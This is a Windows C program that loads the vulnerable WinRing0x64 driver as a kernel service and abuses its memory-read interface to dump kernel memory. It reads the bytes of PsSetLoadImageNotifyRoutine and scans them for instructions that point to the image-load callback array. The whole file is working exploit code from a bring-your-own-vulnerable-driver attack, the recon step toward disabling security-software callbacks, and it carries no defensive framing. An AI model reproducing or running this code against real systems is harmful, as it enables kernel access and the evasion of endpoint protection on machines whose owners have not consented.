#include <windows.h>
#include <psapi.h>
#include <stdio.h>

#define WINRING0_READ_MEM CTL_CODE(40000, 0x833, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct {
    DWORD64 address;
    DWORD   unitSize;
    DWORD   count;
    DWORD64 buffer;
} WINRING0_MEM;

static HANDLE g_hDevice = INVALID_HANDLE_VALUE;

BOOL km_read(DWORD64 address, PVOID buffer, DWORD size) {
    WINRING0_MEM req = {0};
    req.address  = address;
    req.unitSize = 1;
    req.count    = size;
    req.buffer   = (DWORD64)buffer;
    DWORD bytes  = 0;
    return DeviceIoControl(g_hDevice, WINRING0_READ_MEM,
        &req, sizeof(req), &req, sizeof(req), &bytes, NULL);
}

DWORD64 get_ntoskrnl_base() {
    DWORD needed = 0;
    EnumDeviceDrivers(NULL, 0, &needed);
    LPVOID* drivers = (LPVOID*)malloc(needed);
    EnumDeviceDrivers(drivers, needed, &needed);
    DWORD64 base = 0;
    char name[MAX_PATH];
    for (DWORD i = 0; i < needed/sizeof(LPVOID); i++) {
        GetDeviceDriverBaseNameA(drivers[i], name, MAX_PATH);
        if (_stricmp(name,"ntoskrnl.exe")==0 ||
            _stricmp(name,"ntkrnlmp.exe")==0) {
            base = (DWORD64)drivers[i]; break;
        }
    }
    free(drivers);
    return base;
}

DWORD64 find_kernel_export(DWORD64 base, const char* name) {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntoskrnl.exe");
    HMODULE h = LoadLibraryExA(path, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!h) return 0;
    FARPROC f = GetProcAddress(h, name);
    if (!f) { FreeLibrary(h); return 0; }
    DWORD64 offset = (DWORD64)f - (DWORD64)h;
    FreeLibrary(h);
    return base + offset;
}

int load_driver(const char* path) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex = OpenServiceA(scm, "WinRing0x64", SERVICE_ALL_ACCESS);
    if (ex) {
        SERVICE_STATUS ss;
        ControlService(ex, SERVICE_CONTROL_STOP, &ss);
        DeleteService(ex); CloseServiceHandle(ex); Sleep(500);
    }
    SC_HANDLE svc = CreateServiceA(scm,"WinRing0x64","WinRing0x64",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if (!svc) { CloseServiceHandle(scm); return 0; }
    BOOL ok = StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc = OpenServiceA(scm,"WinRing0x64",SERVICE_ALL_ACCESS);
    if (svc) {
        SERVICE_STATUS ss;
        ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500); DeleteService(svc); CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

int main() {
    char driver_path[MAX_PATH], exe_dir[MAX_PATH];
    GetModuleFileNameA(NULL, exe_dir, MAX_PATH);
    char* last = strrchr(exe_dir, '\\');
    if (last) *last = '\0';
    snprintf(driver_path, MAX_PATH, "%s\\WinRing0x64.sys", exe_dir);

    load_driver(driver_path);

    g_hDevice = CreateFileA("\\\\.\\WinRing0_1_2_0",
        GENERIC_READ|GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD64 ntos = get_ntoskrnl_base();
    DWORD64 func = find_kernel_export(ntos, "PsSetLoadImageNotifyRoutine");

    printf("[DUMP] ntoskrnl base : 0x%llX\n", ntos);
    printf("[DUMP] PsSetLoadImage: 0x%llX\n", func);
    printf("[DUMP] First 64 bytes of PsSetLoadImageNotifyRoutine:\n");

    BYTE buf[64];
    km_read(func, buf, 64);
    for (int i = 0; i < 64; i++) {
        printf("%02X ", buf[i]);
        if ((i+1) % 16 == 0) printf("\n");
    }
    printf("\n");

    /* Also scan 256 bytes looking for RIP-relative LEA patterns */
    printf("[DUMP] Scanning for LEA/MOV patterns (callback array ptr):\n");
    for (int i = 0; i < 256; i++) {
        BYTE b[8];
        km_read(func+i, b, 8);
        /* LEA rXX, [rip+offset]: opcodes 48/49/4C 8D xx */
        if ((b[0]==0x48||b[0]==0x49||b[0]==0x4C) && b[1]==0x8D) {
            INT32 off = *(INT32*)(b+3);
            DWORD64 target = func+i+7+off;
            printf("  offset +%d: LEA -> 0x%llX\n", i, target);
        }
        /* MOV rXX, [rip+offset]: opcodes 48/49/4C 8B xx */
        if ((b[0]==0x48||b[0]==0x49||b[0]==0x4C) && b[1]==0x8B) {
            INT32 off = *(INT32*)(b+3);
            DWORD64 target = func+i+7+off;
            printf("  offset +%d: MOV -> 0x%llX\n", i, target);
        }
    }

    CloseHandle(g_hDevice);
    unload_driver();
    getchar();
    return 0;
}
